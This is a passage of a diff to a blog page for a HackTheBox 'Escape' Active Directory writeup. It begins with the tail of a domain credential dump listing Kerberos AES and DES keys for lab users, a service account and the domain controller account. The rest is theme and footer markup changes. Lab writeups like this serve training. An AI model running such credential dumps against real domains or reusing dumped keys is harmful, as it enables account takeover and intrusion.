class="line"><span class="string">Brandon.Brown:des-cbc-md5:91b3a13edf6e6201</span></span><br><span class="line"><span class="string">Ryan.Cooper:aes256-cts-hmac-sha1-96:b9a2b7df6161b9a31a15cfbbb17f68a5b3904eaa2ea21d8ed2ef9acb5e27b997</span></span><br><span class="line"><span class="string">Ryan.Cooper:aes128-cts-hmac-sha1-96:cbe89554da97001fa8fd0967f1799104</span></span><br><span class="line"><span class="string">Ryan.Cooper:des-cbc-md5:f4a445754f540104</span></span><br><span class="line"><span class="string">sql_svc:aes256-cts-hmac-sha1-96:bcbbff82091c7c6f9875261d3ada97274d01b4a1f93ceb16e8154606e392a4ae</span></span><br><span class="line"><span class="string">sql_svc:aes128-cts-hmac-sha1-96:decddf91c717c5a5b84e112f576ece3b</span></span><br><span class="line"><span class="string">sql_svc:des-cbc-md5:73ae15efdafe751f</span></span><br><span class="line"><span class="string">James.Roberts:aes256-cts-hmac-sha1-96:d503bb2c7eea7bf50e7f68ca967e4a6f8a903b22cffa07cf2c160580156f8a43</span></span><br><span class="line"><span class="string">James.Roberts:aes128-cts-hmac-sha1-96:33c8d3d907cd51ffa5274ce0b16ba448</span></span><br><span class="line"><span class="string">James.Roberts:des-cbc-md5:e53de99770a20bf2</span></span><br><span class="line"><span class="string">Nicole.Thompson:aes256-cts-hmac-sha1-96:fd75cd1b02ed4cb838c996db6d7616157d19545c60fb23156abdb3a400bc371c</span></span><br><span class="line"><span class="string">Nicole.Thompson:aes128-cts-hmac-sha1-96:0c86380c787deb624027e9d1d8d71ab2</span></span><br><span class="line"><span class="string">Nicole.Thompson:des-cbc-md5:31b5e386b33e2589</span></span><br><span class="line"><span class="string">DC$:aes256-cts-hmac-sha1-96:7273137e3dec6556a5bdf7757e263b1c50320c00d5b0fff30b2dd4b01543c695</span></span><br><span class="line"><span class="string">DC$:aes128-cts-hmac-sha1-96:e7c64e545316e8cb28c860f10705e2bf</span></span><br><span class="line"><span class="string">DC$:des-cbc-md5:2ae0f438f4b97623</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br><span class="line"><span class="string">[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br></pre></td></tr></table></figure>
 
 
-
-            
-            <div class="post-reward">
-                <a id="rewardBtn" href="javascript:;" class="post-reward-btn waves-effect waves-circle waves-light">赏</a>
-            </div>
-            
-            
-            <blockquote>
-                <p>
-                本文地址：
-                <a href="http://example.com/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/" target="_blank" rel="external">http://example.com/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/</a>
-                </p>
-                <footer><cite><a href="http://example.com">@Hexo</a></cite></footer>
-            </blockquote>
-            </div>
-            
-<nav class="post-nav">
-  
-    <div class="waves-block waves-effect prev fl">
-      <a href="/2025/06/19/Eureka/Eureka/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">HackTheBox——HTB Eureka Writeup</h4>
-      </a>
-    </div>
-  
+    
+  </div>
 
   
-    <div class="waves-block waves-effect next fr">
-      <a href="/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">HackTheBox——HTB Environment Writeup</h4>
-      </a>
-    </div>
-  
-</nav>
+  <!-- Post Copyright -->
 
-
-            
-            
-<div class="duoshuo">
-	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="Escape/HackTheBox——Tracks AD Escape" data-title="HackTheBox——Tracks AD Escape" data-url="http://example.com/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/index.html"></div>
-	<!-- 多说评论框 end -->
-	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
-	<script type="text/javascript">
-	var duoshuoQuery = {short_name:"ysblog"};
-	(function() {
-		var ds = document.createElement('script');
-		ds.type = 'text/javascript';ds.async = true;
-		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-		ds.charset = 'UTF-8';
-		(document.getElementsByTagName('head')[0] 
-		 || document.getElementsByTagName('body')[0]).appendChild(ds);
-	})();
-	</script>
-	<!-- 多说公共JS代码 end -->
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span>Author: </span>
+    <a href="https://n0nome.github.io">n0nome</a>
+  </p>
+  <p class="copyright-item">
+    <span>Link: </span>
+    <a href="https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/">https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/</a>
+  </p>
+  <p class="copyright-item">
+    <span>License: </span>
+    
+    <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+  </p>
 </div>
 
+    
 
+  
 
-
-
-        </div>
+  
+  <footer class="post-footer">
+    
+    <div class="post-tags">
+      
+      <a href="/tags/writeup/">writeup</a>
+      
     </div>
+    
+      
+  <nav class="post-nav">  
+      
+      <a class="prev" href="/2025/06/19/Eureka/Eureka/">  
+        <i class="iconfont icon-left"></i>  
+        <span class="prev-text nav-default">HackTheBox——HTB Eureka Writeup</span>  
+        <span class="prev-text nav-mobile">Prev</span>  
+      </a>  
+      
+      
+      <a class="next" href="/2025/06/19/Environment/HackTheBox%E2%80%94%E2%80%94HTB%20Environment%20Writeup/">  
+        <span class="next-text nav-default">HackTheBox——HTB Environment Writeup</span>  
+        <span class="prev-text nav-mobile">Next</span>  
+        <i class="iconfont icon-right"></i>  
+      </a>  
+      
+  </nav>  
+  
+
+  </footer>
+  
+
 </article>
-
-<div id="reward" class="reward-lay">
-    <a class="reward-off" id="rewardOff" href="javascript:;"><i class="icon icon-close"></i></a>
-    <h3 class="reward-title">
-        <i class="icon icon-quote-left"></i>
-        谢谢大爷~
-        <i class="icon icon-quote-right"></i>
-    </h3>
-    <ul class="reward-items">
-        
-        <li>
-            <img src="/img/wechat.jpg" title="微信打赏二维码" alt="微信打赏二维码">
-            <p>微信</p>
-        </li>
-        
-
-        
-        <li>
-            <img src="/img/alipay.jpg" title="支付宝打赏二维码" alt="支付宝打赏二维码">
-            <p>支付宝</p>
-        </li>
-        
-    </ul>
-</div>
-
-    </div>
-  </main>
-<div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
-
-<script>
-var BLOG_SHARE = {
-    title: "HackTheBox——Tracks AD Escape",
-    pic: "/img/logo.jpg",
-    summary: document.getElementsByName('summary')[0].content,
-    url: "http://example.com/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/index.html"
-};
-</script>
-<div class="global-share" id="global-share">
-    <div class="tit">分享到：</div>
-    <ul class="reset share-icons">
-      <li>
-        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      <li>
-        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      <li>
-        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      <li>
-        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
-          <i class="icon icon-facebook"></i>
-        </a>
-      </li>
-      <li>
-        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
-          <i class="icon icon-twitter"></i>
-        </a>
-      </li>
-      <li>
-        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
-          豆
-        </a>
-      </li>
-    </ul>
- </div>
-
-
-<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-
-
-<script src="/js/main.js"></script>
-
-
-
-
-<div class="search-panel" id="search-panel">
-    <ul class="search-result" id="search-result"></ul>
-</div>
-<script type="text/template" id="search-tpl">
-<li class="item">
-    <a href="/{path}" class="waves-block waves-effect">
-        <div class="title ellipsis" title="{title}">{title}</div>
-        <div class="flex-row flex-middle">
-            <div class="tags ellipsis">
-                {tags}
-            </div>
-            <time class="flex-col time">{date}</time>
         </div>
-    </a>
-</li>
-</script>
+          
+  <div class="comments" id="comments">  
+      
+  </div>  
+  
+
+      </div>
+    </main>
+    <footer id="footer" class="footer">
+      <!-- Social Links -->
+
+<div class="social-links">
+  
+  
+  
+  
+  <a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <a target="_blank" rel="noopener" href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+  
+  
+  <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+  
+</div>
 
 
-<script src="/js/search.js"></script>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme -
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+  <span class="division">|</span>
+  <span class="hosting-info">
+    footer.hosting
+  </span>
+
+  <span class="copyright-year">
+    <span>
+      
+      &copy;
+      
+      2015 - 2025      
+    </span>
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+
+    <span class="author">n0nome</span>
+  </span>
+
+</div>
+    </footer>
+    <div class="back-to-top" id="back-to-top"> <i class="iconfont icon-up"></i> </div>
+  </div>
+    
+    
+    
+    
+    
+    
+    
+  
+
+  
 
 
 
@@ -427,8 +370,19 @@ var BLOG_SHARE = {
 
 
 
+<script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
 
 
 
+<script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+
+
+
+<script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <script type="text/javascript" src="/js/src/even.js?v=3.0.0"></script>
 </body>
+
 </html>
